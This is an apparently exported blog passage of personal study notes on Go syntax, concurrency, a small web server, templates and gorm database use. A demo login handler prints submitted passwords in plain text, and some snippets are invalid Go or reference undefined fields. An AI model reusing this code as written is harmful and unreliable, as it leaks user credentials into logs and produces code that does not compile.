negative&quot;)&#125; else if num &lt; 10 &#123;\tfmt.Println(num, &quot;has 1 digit&quot;)&#125; else &#123;\tfmt.Println(num, &quot;has multiple digits&quot;)&#125;x := 42.0switch x &#123;\tcase 0:\tcase 1, 2: // Can have multiple matches on one case\tcase 42:\t// Cases don&#x27;t &quot;fall through&quot;.\tcase 43:\t// Unreached.\tfallthrough // fallthrough\tdefault:\t// Default case is optional.&#125;\nloop\n// decent forfor x := 0; x &lt; 3; x++ &#123; // ++ is a statement.        fmt.Println(&quot;iteration&quot;, x)&#125;// x == 42 here.// while// For is the only loop statement in Go, but it has alternate forms.for &#123; // Infinite loop.\tbreak    // Just kidding.\tcontinue // Unreached.&#125;// for eachfor key, value := range map[string]int&#123;&quot;one&quot;: 1, &quot;two&quot;: 2, &quot;three&quot;: 3&#125; &#123;\t// for each pair in the map, print key and value\tfmt.Printf(&quot;key=%s, value=%d\\n&quot;, key, value)&#125;\nbuiltin type\nprimitive type\nboolstringint  int8  int16  int32  int64uint uint8 uint16 uint32 uint64 uintptrbyte // alias for uint8rune // alias for int32     // represents a Unicode code pointfloat32 float64complex64 complex128// 0, nil, false, &quot;&quot; are false when we use them in condition\narray &amp; slice\n// Arrays have size fixed at compile time.var a4 [4]int           // An array of 4 ints, initialized to all 0.a5 := [...]int&#123;3, 1, 5, 10, 100&#125; // An array initialized with a fixed size of five// elements, with values 3, 1, 5, 10, and 100.// Arrays have value semantics.// really!? why??????????????a4_cpy := a4            // a4_cpy is a copy of a4, two separate instances.a4_cpy[0] = 25          // Only a4_cpy is changed, a4 stays the same.fmt.Println(a4_cpy[0] == a4[0]) // false// Slices have dynamic size.// slice就是array的指標，所以用slice應該比較符合一般的語意s3 := []int&#123;4, 5, 9&#125;    // Compare to a5. No ellipsis here.s4 := make([]int, 4)    // Allocates slice of 4 ints, initialized to all 0.var d2 [][]float64      // Declaration only, nothing allocated here.bs := []byte(&quot;a slice&quot;) // Type conversion syntax.// Slices (as well as maps and channels) have reference semantics.s3_cpy := s3            // Both variables point to the same instance.s3_cpy[0] = 0           // Which means both are updated.fmt.Println(s3_cpy[0] == s3[0]) // true s3 = append(s3, 4, 5, 6)  // Added 3 elements. Slice now has length of 6.fmt.Println(s3) // Updated slice is now [1 2 3 4 5 6]\nstring\nstring 就是 []byte\nimport (\t&quot;fmt&quot;\t&quot;unicode/utf8&quot;)func main() &#123;\tconst sample = &quot;我爱golang&quot;\tfor i, s := 0, 0; i &lt; len(sample); i = i + s &#123;\t\truneValue, size := utf8.DecodeRuneInString(sample[i:])\t\tfmt.Printf(&quot;position:%v, value:%c \\n&quot;, i, runeValue)\t\ts = size\t&#125;\tfor key, v := range sample &#123;\t\tfmt.Printf(&quot;position:%v, value:%c \\n&quot;, key, v)\t&#125;\tc := []byte(sample)\tc[0] = &#x27;c&#x27;\ts2 := string(c)\tfmt.Println(s2) // c爱golang\tfmt.Println(str + str2) // new string\tvar buffer bytes.Buffer\tbuffer.WriteString(str)\tbuffer.WriteString(str2)\tfmt.Println(buffer.String())&#125;\nmap\nm := map[string]int&#123;&quot;three&quot;: 3, &quot;four&quot;: 4&#125;v, exists := m[&quot;one&quot;]fmt.Printf(&quot;%d %t\\n&quot;, v, exists) // 0 falsem[&quot;one&quot;] = 1delete(m,&quot;one&quot;)\n抽象單位\n變數 (&amp; 初始化與allocate)\nvar x int // Variable declaration. Variables must be declared before use.x = 3     // Variable assignment.// &quot;Short&quot; declarations use := to infer the type, declare, and assign.y := 4sum, prod := learnMultiple(x, y) // 多回傳值// make 的作用是初始化內置的資料結構，也就是slice、map 和 Channel// new 的作用是根據傳入的type分配記憶體(malloc)slice := make([]int, 0, 100)hash := make(map[int]bool, 10)ch := make(chan int, 5)i := new(int)var v inti := &amp;v // 這裡對pointer的操作與C一樣\n函數\nfunc learnMultiple(x, y int) (sum, prod int) &#123;\t// A defer statement pushes a function call onto a list. The list of saved\t// calls is executed AFTER the surrounding function returns.\tdefer fmt.Println(&quot;deferred statements execute in reverse (LIFO) order.&quot;)\tdefer fmt.Println(&quot;\\nThis line is being printed first because&quot;)\treturn x + y, x * y // Return two values.&#125;xBig := func() bool &#123;\treturn x &gt; 10000 // References x declared above switch statement.&#125;\nmy type: interface &amp; struct\n// Define Stringer as an interface type with one method, String.type Stringer interface &#123;    String() string&#125;// Define pair as a struct with two fields, ints named x and y.type pair struct &#123;    x, y int&#125;// Define a method on type pair. Pair now implements Stringer because Pair has defined all the methods in the interface.func (p pair) String() string &#123; // p is called the &quot;receiver&quot;    // Sprintf is another public function in package fmt.    // Dot syntax references fields of p.    return fmt.Sprintf(&quot;(%d, %d)&quot;, p.x, p.y)&#125;// 這邊很搞笑的是，單看pair的宣告完全不知道有沒有實現Stringer的interface// 到時候變成大型程式追蹤起來就是悲劇，還有可能莫名其妙就實現了其他interface也說不定// 繼承，這邊就是c的struct繼承的手法了type hi struct &#123;  a int&#125;type x interface &#123;  add10() (int)&#125;type y interface &#123;  x  add(n int) (int)&#125;func (a hi) add(n int) (int) &#123;  return a.a + n&#125;func (a hi) add10() (int) &#123;  return a.a+10&#125;s := hi&#123;a:9&#125;fmt.Printf(&quot;%d %d&quot;, s.add(2), s.add10())type hi struct &#123;  a int&#125;type wow struct &#123;  hi  b int&#125;hh := hi&#123;a: 1&#125;var demo wow = wow &#123;hi: hh, b:10&#125; // ?????var same_demo wow = wow &#123;hi: hi&#123;a:1&#125;, b:10&#125; // ?????fmt.Printf(&quot;%d&quot;, demo.a)\ngoroutine\n//當成threadfunc hi() &#123;\tvar cnt int = 0\tfor i int; i &lt; 10; i++ &#123;\t\tcnt += i\t&#125;&#125;go hi()// return to anywhere: channelfunc hi(c chan int) &#123;\tvar cnt int = 0\tfor i int; i &lt; 10; i++ &#123;\t\tcnt += i\t&#125;\tc &lt;- cnt // return in general function, yield in generator\t// if c is without any buffer, hi will be blocked!!\t// the time of hi is freezed!!\t// if c is with some buffer, hi will exit without any hesitation\t// this is async fuction call!!&#125;c := make(chan int) // no bufferedgo hi(c)fmt.Printf(&quot;%d\\n&quot;,&lt;-c) // will be blocked, if there is no val in chan// as if we call a function, wait for its return val!!c := make(chan int, 2) // bufferedgo hi(c)fmt.Printf(&quot;%d\\n&quot;,&lt;-c) // will be blocked, if there is no val in chan// as if we call a function, wait for its return val!!// conclusion// 1. for receiver, chan is unsal function call// 2. for sender, the character of chan depends on if chan is with buffer//     a. with buffer: async function call//     b. without buffer: yield in gnerator// there is mutex in golang, just mention\nselect (select/epoll only listen on reading fd_set)\nc := make(chan int)o := make(chan bool)go func() &#123;\tselect &#123;\t\tcase c &lt;- x:\t\t\tx, y = y, x + y\t\tcase &lt;-quit: // \t\t\tfmt.Println(&quot;quit&quot;)\t\t\treturn\t\tcase &lt;- time.After(5 * time.Second):\t\t\tprintln(&quot;timeout&quot;)\t\t\to &lt;- true\t\tdefault:\t\t\t// 當 c 阻塞的時候執行這裡\t&#125;&#125;()&lt;- o\nsync.WaitGroup (join thread)\nimport (    &quot;fmt&quot;    &quot;math/rand&quot;    &quot;sync&quot;    &quot;time&quot;)func random(min, max int) int &#123;    rand.Seed(time.Now().Unix())    return rand.Intn(max-min) + min&#125;func tortoise(totalStep int, wg *sync.WaitGroup) &#123;    defer wg.Done()    for step := 1; step &lt;= totalStep; step++ &#123;        fmt.Printf(&quot;烏龜跑了 %d 步...\\n&quot;, step)    &#125;&#125;func hare(totalStep int, wg *sync.WaitGroup) &#123;    defer wg.Done() // exit()    flags := [...]bool&#123;true, false&#125;    step := 0    for step &lt; totalStep &#123;        isHareSleep := flags[random(1, 10)%2]        if isHareSleep &#123;            fmt.Println(&quot;兔子睡著了zzzz&quot;)        &#125; else &#123;            step += 2            fmt.Printf(&quot;兔子跑了 %d 步...\\n&quot;, step)        &#125;    &#125;&#125;func main() &#123;    wg := new(sync.WaitGroup)    wg.Add(2) // 2 thread to be joined    totalStep := 10    go tortoise(totalStep, wg)    go hare(totalStep, wg)    wg.Wait() // join 2 threads&#125;\nrange with chan = stream(lazy list)\nfunc ints(c chan int) &#123;  i := 0  for &#123;    c &lt;- i    i+=2  &#125;&#125;func main() &#123;  c := make(chan int)  go ints(c)  take := 10  for i := 0; i&lt;take; i++ &#123;    fmt.Printf(&quot;%d\\n&quot;, &lt;-c)  &#125;  fmt.Printf(&quot;wait~~\\n&quot;)  cnt := 0  for ans := range c &#123;    fmt.Printf(&quot;%d\\n&quot;, ans)    if cnt &gt; take &#123;      break    &#125; else &#123;      cnt++    &#125;  &#125;  close(c)&#125;\nchan with direction\nfunc producer(clerk chan&lt;- int) &#123;    fmt.Println(&quot;生產者開始生產整數......&quot;)    for product := 1; product &lt;= 10; product++ &#123;        clerk &lt;- product        fmt.Printf(&quot;生產了 (%d)\\n&quot;, product)    &#125;&#125;func consumer(clerk &lt;-chan int) &#123;    fmt.Println(&quot;消費者開始消耗整數......&quot;)    for i := 1; i &lt;= 10; i++ &#123;        fmt.Printf(&quot;消費了 (%d)\\n&quot;, &lt;-clerk)    &#125;&#125;\npackage\npersonName.go\npackage personvar MyName = &quot;Micheal&quot;var wont_be_export := &quot;hi&quot;\nsayHelloTo.go\npackage personfunc SayHelloTo(s string) string &#123;\tstr := &quot;Hello &quot; + s + &quot;!&quot;\treturn str&#125;func wont_be_export() &#123;\treturn &quot;hi&quot;&#125;\nwill be\npackage personvar MyName = &quot;Micheal&quot;func SayHelloTo(s string) string &#123;\tstr := &quot;Hello &quot; + s + &quot;!&quot;\treturn str&#125;\n基本的backend\nhttp server\npackage mainimport (        &quot;fmt&quot;        &quot;github.com/julienschmidt/httprouter&quot;        &quot;net/http&quot;)func main() &#123;        // Set a new HTTP request multiplexer        mux := httprouter.New()        // Listen to root path        mux.GET(&quot;/&quot;, index)        // Custom 404 page        mux.NotFound = http.HandlerFunc(notFound)        // Custom 500 page\tmux.PanicHandler = errorHandler\t\tmux.GET(&quot;/hello/:name&quot;, hello)\t// demo how to use builtin router\t// http.HandleFunc(&quot;/login&quot;, login)\t// Listen to CSS assets\tmux.ServeFiles(&quot;/css/*filepath&quot;, http.Dir(&quot;public/css&quot;))\t// Listen to JavaScript assets\tmux.ServeFiles(&quot;/js/*filepath&quot;, http.Dir(&quot;public/js&quot;))        // Set the parameters for a HTTP server        server := http.Server&#123;                Addr:    &quot;0.0.0.0:8080&quot;,                Handler: mux,        &#125;        // Run the server.        server.ListenAndServe()&#125;func index(w http.ResponseWriter, r *http.Request, p httprouter.Params) &#123;\tt, err := template.ParseFiles(&quot;views/index.html&quot;)\tif err != nil &#123;\t\thttp.Error(w, err.Error(), 500)\t&#125;\tt.Execute(w, &quot;My Application with CSS&quot;)&#125;func notFound(w http.ResponseWriter, r *http.Request) &#123;\tw.WriteHeader(http.StatusNotFound)\tfmt.Fprintln(w, &quot;Page Not Found&quot;)&#125;func errorHandler(w http.ResponseWriter, r *http.Request, p interface&#123;&#125;) &#123;\tw.WriteHeader(http.StatusInternalServerError)\tfmt.Fprintln(w, &quot;Internal Server Error&quot;)&#125;func hello(w http.ResponseWriter, r *http.Request, p httprouter.Params) &#123;    fmt.Fprintf(w, &quot;Hello, %s!&quot;, p.ByName(&quot;name&quot;))&#125;func login(w http.ResponseWriter, r *http.Request) &#123;\tfmt.Println(&quot;method:&quot;, r.Method)\tif r.Method == &quot;GET&quot; &#123;\t\tt, _ := template.ParseFiles(&quot;login.gtpl&quot;)\t\tlog.Println(t.Execute(w, nil))\t&#125; else &#123;\t\tr.ParseForm()\t\tfmt.Println(&quot;username:&quot;, r.Form[&quot;username&quot;])\t\tfmt.Println(&quot;password:&quot;, r.Form[&quot;password&quot;])\t&#125;&#125;\ntemplate\nfunc index(w http.ResponseWriter, r *http.Request, p httprouter.Params) &#123;\tvar tmpl = template.Must(\t\ttemplate.ParseFiles(&quot;views/layout.html&quot;, &quot;views/index.html&quot;, &quot;views/head.html&quot;),\t)\tdata := struct &#123;\t\tTitle string\t\tItems []string\t\tLang string\t\tFrameworks map[string]string\t&#125;&#123;\t\tTitle: &quot;Major Languages for Web&quot;,\t\tItems: []string&#123;\t\t\t&quot;Python&quot;,\t\t\t&quot;Ruby&quot;,\t\t\t&quot;PHP&quot;,\t\t\t&quot;Java&quot;,\t\t\t&quot;Go&quot;,\t\t&#125;,\t\tLang: &quot;abc&quot;,\t\tFrameworks: map[string]string&#123;\t\t\t&quot;Django&quot;:  &quot;Python&quot;,\t\t\t&quot;Rails&quot;:   &quot;Ruby&quot;,\t\t\t&quot;Laravel&quot;: &quot;PHP&quot;,\t\t\t&quot;Spring&quot;:  &quot;Java&quot;,\t\t\t&quot;Gin&quot;:     &quot;Golang&quot;,\t\t&#125;\t&#125;\terr := tmpl.ExecuteTemplate(w, &quot;layout&quot;, data) // &#123;&#123; define &quot;layout&quot; &#125;&#125;\tif err != nil &#123;\t\thttp.Error(w, err.Error(), 500)\t&#125;&#125;\n&#123;&#123; define &quot;layout&quot; &#125;&#125;&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &#123;&#123; template &quot;head&quot; . &#125;&#125; // &quot;.&quot; is your data from index fuction    &lt;body&gt;        &#123;&#123; template &quot;content&quot; . &#125;&#125; // &#123;&#123; block &quot;content&quot; . &#125;&#125;    &lt;/body&gt;&lt;/html&gt;&#123;&#123; end &#125;&#125;\n&#123;&#123; block &quot;head&quot; . &#125;&#125;&lt;title&gt;&#123;&#123; .Title &#125;&#125;&lt;/title&gt;&#123;&#123; end &#125;&#125;\n&#123;&#123; block &quot;content&quot; . &#125;&#125;&lt;p&gt;&#123;&#123; .Title &#125;&#125;&lt;/p&gt;&#123;&#123; if .Lang &#125;&#125;    &lt;p&gt;My favorite language is &#123;&#123;.Lang&#125;&#125;&lt;/p&gt;&#123;&#123; end &#125;&#125;&lt;ul&gt;    &#123;&#123;range .Items&#125;&#125;         &lt;li&gt;&#123;&#123;.&#125;&#125;&lt;/li&gt; // from &#123;&#123;range .Items&#125;&#125;    &#123;&#123;end&#125;&#125;&lt;/ul&gt;&lt;ul&gt;    &#123;&#123;range $key, $value := .Frameworks&#125;&#125;\t&lt;li&gt;&#123;&#123; $key &#125;&#125; (&#123;&#123; $value &#125;&#125;)&lt;/li&gt;    &#123;&#123;end&#125;&#125;&lt;/ul&gt;&#123;&#123; end &#125;&#125;\nRef\ngo str\ngo basic type\ngo make&amp;new\ngo in x minute\ngo routine\ngo routine1\ngo channel\ngo web route\ngo web form\ngo template\ngo package\ngo logging(not mention here)\ngo CRUD(not mention here)\n","categories":["Golang","Tips"]},{"title":"golang的db操作","url":"/2020/9/golang-db/","content":"動機\n原本只打算看gorm的，但gorm的guide十分的簡略\n所以會先從interface的部分開始看\n\nvanilla sql interface\ngolang有給DB訂出以下介面\n// 常用的，搭配下面的流程一起食用type Driver interface &#123;    Open(name string) (Conn, error)&#125;type Conn interface &#123;    Prepare(query string) (Stmt, error)    Close() error    Begin() (Tx, error)&#125;type Stmt interface &#123;    Close() error    NumInput() int    Exec(args []Value) (Result, error)    Query(args []Value) (Rows, error)&#125;type Result interface &#123;    LastInsertId() (int64, error)    RowsAffected() (int64, error)&#125;type Rows interface &#123;    Columns() []string    Close() error    Next(dest []Value) error&#125;type RowsAffected int64func (RowsAffected) LastInsertId() (int64, error)func (v RowsAffected) RowsAffected() (int64, error)type Value interface&#123;&#125;/*Value的實際的data type可以是nilint64float64bool[]bytestringtime.Time*/// Transactiontype Tx interface &#123;    Commit() error    Rollback() error&#125;// 可以偷吃步的跑sql介面type Execer interface &#123;    Exec(query string, args []Value) (Result, error)&#125;// 把golang的值轉成sql介面看得懂的值type ValueConverter interface &#123;    ConvertValue(v interface&#123;&#125;) (Value, error)&#125;// 可以替自己的struct實踐Valuer與Scanner// 讓sql懂我們的data type// 同上 &lt;go struct&gt;.Value()// myStruct =&gt; Valuetype Valuer interface &#123;    Value() (Value, error)&#125;// &lt;*go struct&gt;.Scan(Value)// Value =&gt; myStructtype Scanner interface &#123;    Scan(src interface&#123;&#125;) error&#125;\n一般的流程是\nOpen =(Conn)=&gt; Prepare =(Stmt)=&gt; Exec -&gt; Result\t\t\t\t Query -&gt; Rows Rows的部分可以用Scan把資料轉成golang看得懂的資料\nfunc main() &#123;    db, _ := sql.Open(&quot;sqlite3&quot;, &quot;./foo.db&quot;)    //插入資料    stmt, _ := db.Prepare(&quot;INSERT INTO userinfo(username, department, created) values(?,?,?)&quot;)    res, _ := stmt.Exec(&quot;astaxie&quot;, &quot;研發部門&quot;, &quot;2012-12-09&quot;)    id, _ := res.LastInsertId()    fmt.Println(id)    //更新資料    stmt, _ = db.Prepare(&quot;update userinfo set username=? where uid=?&quot;)    res, _ = stmt.Exec(&quot;astaxieupdate&quot;, id)    affect, _ := res.RowsAffected()    fmt.Println(affect)    //查詢資料    rows, _ := db.Query(&quot;SELECT * FROM userinfo&quot;) // 這是偷吃步    for rows.Next() &#123;        var uid int        var username string        var department string        var created time.Time        _ = rows.Scan(&amp;uid, &amp;username, &amp;department, &amp;created)                fmt.Println(uid)        fmt.Println(username)        fmt.Println(department)        fmt.Println(created)    &#125;    //刪除資料    stmt, _ = db.Prepare(&quot;delete from userinfo where uid=?&quot;)    res, _ = stmt.Exec(id)    affect, _ = res.RowsAffected()        fmt.Println(affect)    db.Close()&#125;\n寫在前面\n因為go沒有class所以orm變得十分奇怪(難懂)\n明明在其他語言看起來很自然的東西在這裡就是會變得十分反人類\n像一般都是用class method與instance method來操作\n但因為沒有class所以要使用class method要先把那個type的值生出來，再丟到constructor之類的函數…\n還有判斷要用哪個table是用type判斷，但是這個判斷是在 開頭(db.Table 或是 db.Model) 或是 結尾(Find(&amp;user), First(&amp;user), Scan(&amp;user)…)\n十分反人類，第一眼看不能知道到底是在那個table上操作…\nCURD\n基本用法\n基本上sql可以切成四個部分\nA是select或是update之類的部分\nb是column的名字\nD是table name\n剩下的就用C代稱\nA b,b,b,....FROM DWHERE ...GROUP BY ...ORDER BY ...LIMIT ...HAVING ...\ngorm的基本用法是\n\n連到db\n把sql分解成chained method\n\n要注意的是原本orm是用class代表table，但go沒有class\n所以用\n\nModel(&amp;type) 或是\n要寫入的變數的資料型別\n\n來判斷適用哪個table\n用起來大概的感覺像下面這樣\ndb, err := gorm.Open(sqlite.Open(&quot;gorm.db&quot;), &amp;gorm.Config&#123;&#125;)db.D.Select(b,b,b,...).Omit(b,b,b....).C.C.C.....A()\nCreate\ntype User struct &#123;  ID   int64 `gorm:&quot;default:uuid_generate_v3()&quot;`  Name string `gorm:&quot;default:galeone&quot;`  Age  int64  `gorm:&quot;default:18&quot;`  FullName  string `gorm:&quot;-&gt;;type:GENERATED ALWAYS AS (concat(firstname,&#x27; &#x27;,lastname));default:(-);`&#125;user := User&#123;Name: &quot;Jinzhu&quot;, Age: 18, Birthday: time.Now()&#125;result := db.Create(&amp;user)// 用array插入var users = []User&#123;&#123;Name: &quot;jinzhu1&quot;&#125;, &#123;Name: &quot;jinzhu2&quot;&#125;, &#123;Name: &quot;jinzhu3&quot;&#125;&#125;DB.Create(&amp;users)// 用map插入DB.Model(&amp;User&#123;&#125;).Create([]map[string]interface&#123;&#125;&#123;  &#123;&quot;Name&quot;: &quot;jinzhu_1&quot;, &quot;Age&quot;: 18&#125;,  &#123;&quot;Name&quot;: &quot;jinzhu_2&quot;, &quot;Age&quot;: 20&#125;,&#125;)// 只選 Name Age CreatedAt的值插入到tabledb.Select(&quot;Name&quot;, &quot;Age&quot;, &quot;CreatedAt&quot;).Create(&amp;user)// 不讓 Name Age CreatedAt的值插入到tabledb.Omit(&quot;Name&quot;, &quot;Age&quot;, &quot;CreatedAt&quot;).Create(&amp;user)\nUpdate\nuser.Name = &quot;jinzhu 2&quot;user.Age = 100db.Save(&amp;user)// 根據user的值當成where條件撈值，再把name寫成hellodb.Model(&amp;user).Update(&quot;name&quot;, &quot;hello&quot;)// 從table撈值設定Name與Agedb.Model(User&#123;&#125;).Where(&quot;role = ?&quot;, &quot;admin&quot;).Updates(User&#123;Name: &quot;hello&quot;, Age: 18&#125;)db.Table(&quot;users&quot;).Where(&quot;role = ?&quot;, &quot;admin&quot;).Updates(User&#123;Name: &quot;hello&quot;, Age: 18&#125;)// 可以用select與omit選定需要或不需要的column去設定db.Model(&amp;user).Omit(&quot;name&quot;).Updates(map[string]interface&#123;&#125;&#123;&quot;name&quot;: &quot;hello&quot;, &quot;age&quot;: 18, &quot;actived&quot;: false&#125;)// 更新成subquery的值DB.Model(&amp;user).Update(&quot;company_name&quot;, DB.Model(&amp;Company&#123;&#125;).Select(&quot;name&quot;).Where(&quot;companies.id = users.company_id&quot;))// UPDATE &quot;users&quot; SET &quot;company_name&quot; = (SELECT name FROM companies WHERE companies.id = users.company_id);\nDelete\ndb.Delete(&amp;email) // 用email的值為條件刪db.Where(&quot;name = ?&quot;, &quot;jinzhu&quot;).Delete(&amp;email) // 用where與email的值為條件刪db.Delete(&amp;User&#123;&#125;, 10) // 用ID刪db.Where(&quot;email LIKE ?&quot;, &quot;%jinzhu%&quot;).Delete(Email&#123;&#125;)// DELETE from emails where email LIKE &quot;%jinzhu%&quot;\nsoft delete\n不把整筆刪掉，反而是多一個欄位紀錄被執行到刪除的時間\ntype User struct &#123;  ID      int  Deleted gorm.DeletedAt  Name    string&#125;db.Delete(&amp;user)// UPDATE users SET deleted_at=&quot;2013-10-29 10:23&quot; WHERE id = 111;db.Where(&quot;age = 20&quot;).Find(&amp;user)// SELECT * FROM users WHERE age = 20 AND deleted_at IS NULL;db.Unscoped().Where(&quot;age = 20&quot;).Find(&amp;users)// SELECT * FROM users WHERE age = 20;db.Unscoped().Delete(&amp;order)// DELETE FROM orders WHERE id=10;\nRead\nresult := db.Find(&amp;users)db.First(&amp;user)// SELECT * FROM users ORDER BY id LIMIT 1;db.Take(&amp;user)// SELECT * FROM users LIMIT 1;db.Last(&amp;user)// SELECT * FROM users ORDER BY id DESC LIMIT 1;db.Select(&quot;name, sum(age) as total&quot;).Where(&quot;name = ?&quot;, &quot;jinzhu&quot;).Where(&quot;name IN ?&quot;, []string&#123;&quot;jinzhu&quot;, &quot;jinzhu 2&quot;&#125;). // name IN (&quot;jinzhu&quot;, &quot;jinzhu 2&quot;)Where(&quot;name = ? AND age &gt;= ?&quot;, &quot;jinzhu&quot;, &quot;22&quot;).Where(&amp;User&#123;Name: &quot;jinzhu&quot;, Age: 20&#125;). // ANDWhere(map[string]interface&#123;&#125;&#123;&quot;name&quot;: &quot;jinzhu&quot;, &quot;age&quot;: 20&#125;). // ANDWhere([]int64&#123;20, 21, 22&#125;). // IN (20, 21, 22)Not(&quot;name = ?&quot;, &quot;jinzhu&quot;) // 想用not就是把Where改成Not即可Where(&quot;role = ?&quot;, &quot;admin&quot;).Or(&quot;role = ?&quot;, &quot;super_admin&quot;). // role = &#x27;admin&#x27; OR role = &#x27;super_admin&#x27;Order(&quot;age desc, name&quot;).Group(&quot;name&quot;).Having(&quot;name = ?&quot;, &quot;group&quot;).Limit(3).Offset(3).Find(&amp;users)type result struct &#123;  Name  string  Email string&#125;//居然是用字串做join!? 不是應該像LEFT_JOIN(&quot;emails&quot;)之類的嗎//都要寫這麼多，乾脆直接寫sql還比較好懂db.Model(&amp;User&#123;&#125;).Select(&quot;users.name, emails.email&quot;).Joins(&quot;left join emails on emails.user_id = users.id&quot;).Scan(&amp;result&#123;&#125;)rows, err := db.Table(&quot;users&quot;).Select(&quot;users.name, emails.email&quot;).Joins(&quot;left join emails on emails.user_id = users.id&quot;).Rows()for rows.Next() &#123;  ...&#125;db.Model(&amp;User&#123;&#125;).Where(&quot;name = ?&quot;, &quot;jinzhu&quot;).Or(&quot;name = ?&quot;, &quot;jinzhu 2&quot;).Count(&amp;count)\nscopes\nfunc PaidWithCod(db *gorm.DB) *gorm.DB &#123;  return db.Where(&quot;pay_mode_sign = ?&quot;, &quot;C&quot;)&#125;func OrderStatus(status []string) func (db *gorm.DB) *gorm.DB &#123;  return func (db *gorm.DB) *gorm.DB &#123;    return db.Where(&quot;status IN (?)&quot;, status)  &#125;&#125;db.Scopes(PaidWithCod, OrderStatus([]string&#123;&quot;paid&quot;, &quot;shipped&quot;&#125;)).Find(&amp;orders)\nFindInBatches\n// 每次批量处理 100 条result := DB.Where(&quot;processed = ?&quot;, false).FindInBatches(&amp;results, 100, func(tx *gorm.DB, batch int) error &#123;  for _, result := range results &#123;    // 批量处理找到的记录  &#125;  tx.Save(&amp;results)  tx.RowsAffected // 本次批量操作影响的记录数  batch // Batch 1, 2, 3  // 如果返回错误会终止后续批量操作  return nil&#125;)\nnamed args\nDB.Where(&quot;name1 = @name OR name2 = @name&quot;, sql.Named(&quot;name&quot;, &quot;jinzhu&quot;)).Find(&amp;user)// SELECT * FROM `users` WHERE name1 = &quot;jinzhu&quot; OR name2 = &quot;jinzhu&quot;DB.Where(&quot;name1 = @name OR name2 = @name&quot;, map[string]interface&#123;&#125;&#123;&quot;name&quot;: &quot;jinzhu&quot;&#125;).First(&amp;user)// SELECT * FROM `users` WHERE name1 = &quot;jinzhu&quot; OR name2 = &quot;jinzhu&quot; ORDER BY `users`.`id` LIMIT 1\nNested query&amp;condition\ndb.Where(    DB.Where(&quot;pizza = ?&quot;, &quot;pepperoni&quot;).Where(DB.Where(&quot;size = ?&quot;, &quot;small&quot;).Or(&quot;size = ?&quot;, &quot;medium&quot;)),).Or(    DB.Where(&quot;pizza = ?&quot;, &quot;hawaiian&quot;).Where(&quot;size = ?&quot;, &quot;xlarge&quot;),).Find(&amp;Pizza&#123;&#125;).Statement// SELECT * FROM `pizzas` WHERE (pizza = &quot;pepperoni&quot; AND (size = &quot;small&quot; OR size = &quot;medium&quot;)) OR (pizza = &quot;hawaiian&quot; AND size = &quot;xlarge&quot;)subQuery := db.Select(&quot;AVG(age)&quot;).Where(&quot;name LIKE ?&quot;, &quot;name%&quot;).Table(&quot;users&quot;)db.Select(&quot;AVG(age) as avgage&quot;).Group(&quot;name&quot;).Having(&quot;AVG(age) &gt; (?)&quot;, subQuery).Find(&amp;results)subQuery1 := DB.Model(&amp;User&#123;&#125;).Select(&quot;name&quot;)subQuery2 := DB.Model(&amp;Pet&#123;&#125;).Select(&quot;name&quot;)db.Table(&quot;(?) as u, (?) as p&quot;, subQuery1, subQuery2).Find(&amp;User&#123;&#125;)\nAssociation\nbelong &amp; has\nbelong就是有外鍵\nhas就是知道這個物件有自己的外鍵，model中包含另一個model\n確認是has還是belong之後，還有一與多的分別，\n就是包含的model是只有一個(變數)，還是有許多個(array)\n例如:有book與copy_of_book(印出來的書)\nbook會知道有copy_of_book所以是has many，畢竟不只印一本\ncopy_of_book是belong to book，要透過外鍵拉book的資料\n還有一個是Polymorphism Association\n原本外鍵就是指向一個我們預先知道的table\n但如果現在外鍵可以指到不只一個的table的話…\n從DB的角度來看就是除了外鍵還多了Model的名字\n例如，Dog與Cat都可以有自己的玩具，但玩具怎麼知道自己是屬於誰?\n用id區分可能會重複!!(Cat的1與Dog的1)\n所以有Polymorphism Association\n// user belong to companytype User struct &#123;  gorm.Model  Name      string  CompanyID int  Company   Company&#125;type Company struct &#123;  ID   int  Name string&#125;// ===================// User has one CreditCardtype User struct &#123;  gorm.Model  CreditCard CreditCard//   Name       string     `sql:&quot;index&quot;`//   CreditCard CreditCard `gorm:&quot;foreignkey:UserName;references:name&quot;`// foreignkey是指外鍵的名字，這裡是has one，所以外鍵在對面，看CreditCard// references是指外鍵的值的來源，這裡是User的Name&#125;// CreditCard belong to Usertype CreditCard struct &#123;  gorm.Model  Number string  UserID uint  // UserName string&#125;// ===================// User has many CreditCardtype User struct &#123;  gorm.Model  CreditCards []CreditCard&#125;// CreditCard belong to Usertype CreditCard struct &#123;  gorm.Model  Number string  UserID uint&#125;// ===================type Dog struct &#123;  ID   int  Name string  Toys []Toy `gorm:&quot;polymorphic:Owner&quot;`&#125;type Cat struct &#123;  ID   int  Name string  Toys []Toy `gorm:&quot;polymorphic:Owner&quot;`&#125;type Toy struct &#123;  ID        int  Name      string  OwnerID   int  OwnerType string&#125;// ===================// User has and belongs to many languages, `user_languages` is the join tabletype User struct &#123;  gorm.Model  Languages []Language `gorm:&quot;many2many:user_languages;&quot;`&#125;type Language struct &#123;  gorm.Model  Name string&#125;// ===================// User has and belongs to many languages, use `user_languages` as join tabletype User struct &#123;  gorm.Model  // 順便一提多主鍵的寫法  //ID         uint   `gorm:&quot;primaryKey&quot;`  //Name     string `gorm:&quot;primaryKey&quot;`  Languages []*Language `gorm:&quot;many2many:user_languages;&quot;`&#125;type Language struct &#123;  gorm.Model  Name string  Users []*User `gorm:&quot;many2many:user_languages;&quot;`&#125;// ===================type User struct &#123;    gorm.Model    Profiles []Profile `gorm:&quot;many2many:user_profiles;foreignKey:Refer;joinForeignKey:UserReferID;References:UserRefer;JoinReferences:UserRefer&quot;`    // 原本應該是 Refer -&gt; UserRefer，但現在多一層 Refer -&gt; [UserReferID -&gt; UserRefer] -&gt; UserRefer    Refer    uint&#125;type Profile struct &#123;    gorm.Model    Name      string    UserRefer uint&#125;// 会创建连接表：user_profiles//   foreign key: user_refer_id, reference(real): users.refer//   foreign key: profile_refer, reference(real): profiles.user_refer// If userA followed userB, then userB could see userA in its followers.type User struct &#123;  gorm.Model  Followings []*User `gorm:&quot;many2many:user_relation;foreignKey:ID;joinForeignKey:UserA;References:ID;joinReferences:UserB&quot;`  Followers []*User `gorm:&quot;many2many:user_relation;foreignKey:ID;joinForeignKey:UserB;References:ID;joinReferences:UserA&quot;`&#125;\nPreload &amp; Association &amp; Related\n以下面的table為例\ntype User struct &#123;    gorm.Model    Name string    Company []Company&#125;type Company struct &#123;    gorm.Model    Job    string    User   User    UserID 